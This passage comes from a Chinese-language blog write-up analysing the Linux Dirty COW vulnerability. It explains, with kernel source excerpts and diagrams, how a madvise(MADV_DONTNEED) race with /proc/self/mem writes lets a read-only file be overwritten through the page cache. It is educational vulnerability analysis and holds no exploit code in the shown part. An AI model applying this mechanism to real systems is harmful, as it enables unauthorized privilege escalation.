<span class="keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应流程图如下：</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651325336706946/d26edeb2f385e18e64b3157978e6673222d7a3ad.png" alt="dirtycow3"></p>
+<h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p><strong>get_user_pages</strong> 第三次调用 <strong>follow_page_mask</strong> 进行寻页，注意此时的 <strong>FOLL_WRITE</strong> 已被置为 0，也就是在寻页的时候不再需要页具有写权限。正常来说，程序会直接返回找到的页表项 map，然后执行写操作(注意这里写的地方是 COW 出来的副本，也就是图中对应的 anonymous page，并不是 page cache)。但是因为此时我们通过 <strong>pthread_join</strong> 函数加入了 <strong>madviseThread</strong> 线程，<strong>cond_resched()</strong> 函数使其执行，里面的 <strong>madvise</strong> 函数 <strong>advice</strong> 位被置为 <strong>MADV_DONTNEED</strong>，所以 map 页表项 COW 出来的副本(anonymous page)会被置空。</p>
+<p>对应流程图：</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651382699766968/cd3854460f2afe3f5eee863d1e3dbb75d85d9552.png" alt="dirtycow4"></p>
+<p>回到 <strong>procselfmemThread</strong> 线程，因为页表已被置空，所以会再一次触发中断，进入 <strong>faultin_page</strong> 等一系列函数，然后进到 <strong>do_fault</strong>，因为此时页表已经不被要求具有写权限，所以不会执行 COW 操作，而是直接映射文件，也就是直接返回了 page cache 这个物理内存。</p>
+<p>对应函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">do_fault(fe)&#123;</span><br><span class="line">	<span class="comment">//如果不要求目标内存具有写权限时导致缺页，内核不会执行COW操作产生副本</span></span><br><span class="line">	<span class="keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line">		<span class="keyword">return</span> do_read_fault(fe, pgoff);</span><br><span class="line">	<span class="comment">//如果要求目标内存具有写权限时导致缺页，目标内存映射是一个VM_PRIVATE的映射，内核会执行COW操作产生副本</span></span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(fe, pgoff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_read_fault(fe,pgoff)&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">//不执行COW，直接映射文件。</span></span><br><span class="line">	__do_fault(fe, pgoff, <span class="literal">NULL</span>, &amp;fault_page, <span class="literal">NULL</span>);</span><br><span class="line">	...</span><br><span class="line">	ret |= alloc_set_pte(fe, <span class="literal">NULL</span>, fault_page);</span><br><span class="line">	...</span><br><span class="line">	ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应流程图如下：</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651382925127930/58a1fd21557e53a1c1beb45bd9fddc37fe0c2284.png" alt="dirtycow5"></p>
+<p>此时我们再进入 <strong>procselfmemThread</strong> 线程，通过向 /proc/self/mem 强制执行写操作，写 /proc/self/mem 的原理就是调用 kmap ，kmap 也是指向 map 的，也就会直接将内容写入 map 物理内存。</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651383600681010/afd9fffd11019fe8206e419b0753be55a3fecc38.png" alt="dirtycow6"></p>
+<p>最后由于page cache的写回机制，最终会覆盖磁盘上的文件，攻击完成。</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651383664718195/2adf67315f755f8047b968a2996e849f8aaae471.png" alt="dirtycow7"></p>
+<hr>
+<p>参考博客</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39153421/article/details/116742488">https://blog.csdn.net/qq_39153421/article/details/116742488</a></p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25918300">https://zhuanlan.zhihu.com/p/25918300</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv11057658">https://www.bilibili.com/read/cv11057658</a></p>
+<p><a target="_blank" rel="noopener" href="https://atum.li/2016/10/25/dirtycow/">https://atum.li/2016/10/25/dirtycow/</a></p>
+<p><a target="_blank" rel="noopener" href="https://codeantenna.com/a/bjX4ujmG2Y">https://codeantenna.com/a/bjX4ujmG2Y</a></p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf">奔跑吧-linux内核-内存管理-DirtyCow.pdf</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/about/">about</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/categories/">category</a></li>
+         
+          <li><a href="/link/">link</a></li>
+         
+          <li><a href="/search/">search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.1.</span> <span class="toc-text">条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%86%99%E6%97%B6%E6%8B%B7%E8%B4%9D%E6%8A%80%E6%9C%AF-copy-on-write"><span class="toc-number">2.2.</span> <span class="toc-text">Linux 写时拷贝技术(copy-on-write)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B5%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">页式内存管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86"><span class="toc-number">2.4.</span> <span class="toc-text">缺页中断处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Page-cache"><span class="toc-number">2.5.</span> <span class="toc-text">Page cache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">2.6.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mmap"><span class="toc-number">2.6.1.</span> <span class="toc-text">mmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#madvice"><span class="toc-number">2.6.2.</span> <span class="toc-text">madvice</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#write"><span class="toc-number">2.6.3.</span> <span class="toc-text">write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-self-mem"><span class="toc-number">2.6.4.</span> <span class="toc-text">&#x2F;proc&#x2F;self&#x2F;mem</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">触发原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">POC 代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">源码及漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1"><span class="toc-number">5.1.</span> <span class="toc-text">step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2"><span class="toc-number">5.2.</span> <span class="toc-text">step2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3"><span class="toc-number">5.3.</span> <span class="toc-text">step3</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&text=Linux高危漏洞Dirtycow复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&is_video=false&description=Linux高危漏洞Dirtycow复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux高危漏洞Dirtycow复现&body=Check out this article: http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&name=Linux高危漏洞Dirtycow复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&t=Linux高危漏洞Dirtycow复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    Xu4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/about/">about</a></li><!--
+     --><!--
+       --><li><a href="/archives/">articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">category</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     --><!--
+       --><li><a href="/search/">search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
